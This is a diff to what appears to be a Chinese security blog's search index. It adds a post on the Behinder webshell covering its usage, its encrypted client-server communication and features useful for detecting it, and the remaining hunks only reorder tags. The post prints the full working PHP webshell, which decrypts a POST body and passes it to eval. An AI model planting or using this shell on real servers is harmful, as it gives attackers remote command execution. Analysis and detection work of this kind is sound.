@@ -4,6 +4,33 @@
   
   
   <entry>
+    <title>冰蝎webshell与通信方式</title>
+    <link href="/%E5%86%B0%E8%9D%8Ewebshell%E4%B8%8E%E9%80%9A%E4%BF%A1%E6%96%B9%E5%BC%8F/"/>
+    <url>/%E5%86%B0%E8%9D%8Ewebshell%E4%B8%8E%E9%80%9A%E4%BF%A1%E6%96%B9%E5%BC%8F/</url>
+    
+    <content type="html"><![CDATA[<p>使用方法与特性简介</p><a id="more"></a><h1 id="冰蝎"><a href="#冰蝎" class="headerlink" title="冰蝎"></a>冰蝎</h1><h2 id="00-项目地址"><a href="#00-项目地址" class="headerlink" title="00 项目地址"></a>00 项目地址</h2><p><a href="https://github.com/rebeyond/Behinder" target="_blank" rel="noopener">GitHub地址</a><br>可以在此处看到作者的介绍</p><p>下面是摘抄的作者运行环境介绍和FAQ</p><ul><li><p>运行环境</p><ul><li>客户端：jre6~jre8</li><li>服务端：.net 2.0+;php 5.4-7.2;java 6+</li></ul></li><li><p>FAQ</p><ul><li><p>Mac系统下好像打不开？</p><p>Mac系统下需要通过-XstartOnFirstThread参数启动，java -XstartOnFirstThread -jar Behinder.jar。</p></li><li><p>直接用浏览器访问shell会报错？</p><p>客户端附带的服务端为最简版本，没有做容错处理，所以直接浏览器访问可能会报错，但是不影响客户端正常连接。如果不介意服务端体积增加几个字节，可以自己加一些容错判断语句。</p></li><li><p>我可以对shell进行修改么？</p><p>客户端附带的服务端可以进行各种变形，只要基本逻辑不变，客户端即可正常连接。</p></li><li><p>开了socks代理，但是服务器并没有开启代理端口？</p><p>socks代理的端口不是开在远程服务器上的，是开在本地的，利用socks客户端直接连接本地IP的代理端口即可，冰蝎会把本地端口的流量通过http隧道透传至远程服务器网络。</p></li></ul></li></ul><h2 id="01-使用"><a href="#01-使用" class="headerlink" title="01 使用"></a>01 使用</h2><p>界面如下，与同类工具相似</p><p><img src="/%E5%86%B0%E8%9D%8Ewebshell%E4%B8%8E%E9%80%9A%E4%BF%A1%E6%96%B9%E5%BC%8F/1.png" srcset="/img/loading.gif" alt></p><p>在空白处右键即可添加新连接</p><p><img src="/%E5%86%B0%E8%9D%8Ewebshell%E4%B8%8E%E9%80%9A%E4%BF%A1%E6%96%B9%E5%BC%8F/3.png" srcset="/img/loading.gif" alt></p><p>双击一个连接即可进行进一步操作</p><p><img src="/%E5%86%B0%E8%9D%8Ewebshell%E4%B8%8E%E9%80%9A%E4%BF%A1%E6%96%B9%E5%BC%8F/2.png" srcset="/img/loading.gif" alt></p><p>虚拟终端、socks代理、文件管理、反弹shell、数据库管理等</p><p>具体介绍可以看作者的<a href="https://xz.aliyun.com/t/2799" target="_blank" rel="noopener">介绍</a></p><h2 id="02-通信"><a href="#02-通信" class="headerlink" title="02 通信"></a>02 通信</h2><p>与常见的webshell相比，冰蝎的shell最大特点是对通信进行了加密<br>以PHP代码为例进行分析，PHP shell代码如下：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>@error_reporting(<span class="hljs-number">0</span>);session_start();<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'pass'</span>]))&#123;    $key=substr(md5(uniqid(rand())),<span class="hljs-number">16</span>);    $_SESSION[<span class="hljs-string">'k'</span>]=$key;    <span class="hljs-keyword">print</span> $key;&#125;<span class="hljs-keyword">else</span>&#123;    $key=$_SESSION[<span class="hljs-string">'k'</span>];$post=file_get_contents(<span class="hljs-string">"php://input"</span>);<span class="hljs-keyword">if</span>(!extension_loaded(<span class="hljs-string">'openssl'</span>))&#123;$t=<span class="hljs-string">"base64_"</span>.<span class="hljs-string">"decode"</span>;$post=$t($post.<span class="hljs-string">""</span>);<span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;strlen($post);$i++) &#123;     $post[$i] = $post[$i]^$key[$i+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>];     &#125;&#125;<span class="hljs-keyword">else</span>&#123;$post=openssl_decrypt($post, <span class="hljs-string">"AES128"</span>, $key);&#125;    $arr=explode(<span class="hljs-string">'|'</span>,$post);    $func=$arr[<span class="hljs-number">0</span>];    $params=$arr[<span class="hljs-number">1</span>];<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($p)</span> </span>&#123;<span class="hljs-keyword">eval</span>($p.<span class="hljs-string">""</span>);&#125;&#125;@<span class="hljs-keyword">new</span> C($params);&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>通信过程：</p><ol><li><p>检测GET请求是否有?pass参数，产生随机的16位长密钥写入session，可以抓包分析密钥与PHPSESSID的对应情况<br>密钥生成方式如下，确保密钥难以计算和预测</p><pre><code class="hljs php">$key=substr(md5(uniqid(rand())),<span class="hljs-number">16</span>);</code></pre></li><li><p>检测是否开启了OpenSSL</p><ul><li>如果开启，就使用密钥进行AES加密</li><li>如果没有开启，就进行异或然后base64加密</li></ul></li></ol><p>作者所作流程图如下：</p><p><img src="/%E5%86%B0%E8%9D%8Ewebshell%E4%B8%8E%E9%80%9A%E4%BF%A1%E6%96%B9%E5%BC%8F/4.png" srcset="/img/loading.gif" alt></p><p>更详细的介绍可以看 <a href="https://xz.aliyun.com/t/2774" target="_blank" rel="noopener">这里</a></p><h2 id="03-检测"><a href="#03-检测" class="headerlink" title="03 检测"></a>03 检测</h2><p>由于冰蝎对通信过程进行了加密，一般的检测方法无法识别出其中的恶意内容，但它仍存在一些可供检测的特征</p><ol><li><p>连接开始时固定发送一个有pass参数GET请求</p></li><li><p>获取密钥时固定返回一个16位的密钥，可以用正则判断</p></li><li><p>v1.0版本中User-Agent头为JDK版本，之后的版本为在十几种常见User-Agent头中随机选取，下图来自网络</p><p><img src="/%E5%86%B0%E8%9D%8Ewebshell%E4%B8%8E%E9%80%9A%E4%BF%A1%E6%96%B9%E5%BC%8F/5.png" srcset="/img/loading.gif" alt></p></li><li><p>shell中含有加密、解密、命令执行等相关关键字，可以据此对上传的文件进行判断</p></li><li><p>对通信数据的base64编码和二进制编码进行匹配</p></li></ol>]]></content>
+    
+    
+    <categories>
+      
+      <category>工具使用</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>工具使用</tag>
+      
+      <tag>渗透测试</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>心脏滴血漏洞简介 CVE-2014-0160</title>
     <link href="/%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B-CVE-2014-0160/"/>
     <url>/%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B-CVE-2014-0160/</url>
@@ -19,6 +46,8 @@
     
     
     <tags>
+      
+      <tag>渗透测试</tag>
       
       <tag>漏洞分析</tag>
       
@@ -70,11 +99,11 @@
     
     <tags>
       
-      <tag>渗透测试</tag>
+      <tag>MSF</tag>
       
       <tag>工具使用</tag>
       
-      <tag>MSF</tag>
+      <tag>渗透测试</tag>
       
     </tags>
     
@@ -99,11 +128,11 @@
     
     <tags>
       
-      <tag>渗透测试</tag>
+      <tag>MSF</tag>
       
       <tag>工具使用</tag>
       
-      <tag>MSF</tag>
+      <tag>渗透测试</tag>
       
     </tags>
     
@@ -153,11 +182,11 @@
     
     <tags>
       
-      <tag>渗透测试</tag>
+      <tag>MSF</tag>
       
       <tag>工具使用</tag>
       
-      <tag>MSF</tag>
+      <tag>渗透测试</tag>
       
     </tags>
     
@@ -182,11 +211,11 @@
     
     <tags>
       
-      <tag>渗透测试</tag>
+      <tag>MSF</tag>
       
       <tag>工具使用</tag>
       
-      <tag>MSF</tag>
+      <tag>渗透测试</tag>
       
     </tags>
     
@@ -236,9 +265,9 @@
     
     <tags>
       
-      <tag>WEB安全</tag>
-      
       <tag>计算机网络</tag>
+      
+      <tag>WEB安全</tag>
       
     </tags>
     
@@ -263,9 +292,9 @@
     
     <tags>
       
-      <tag>WEB安全</tag>
-      
       <tag>计算机网络</tag>
+      
+      <tag>WEB安全</tag>
       
       <tag>DoS</tag>
       
@@ -477,9 +506,9 @@
       
       <tag>WEB安全</tag>
       
-      <tag>XSS</tag>
-      
       <tag>CRLF</tag>
+      
+      <tag>XSS</tag>
       
     </tags>
     
@@ -506,9 +535,9 @@
       
       <tag>WEB安全</tag>
       
-      <tag>渗透测试</tag>
-      
       <tag>工具使用</tag>
+      
+      <tag>渗透测试</tag>
       
     </tags>
     
@@ -979,9 +1008,9 @@
       
       <tag>WEB安全</tag>
       
-      <tag>渗透测试</tag>
-      
       <tag>工具使用</tag>
+      
+      <tag>渗透测试</tag>
       
     </tags>
     
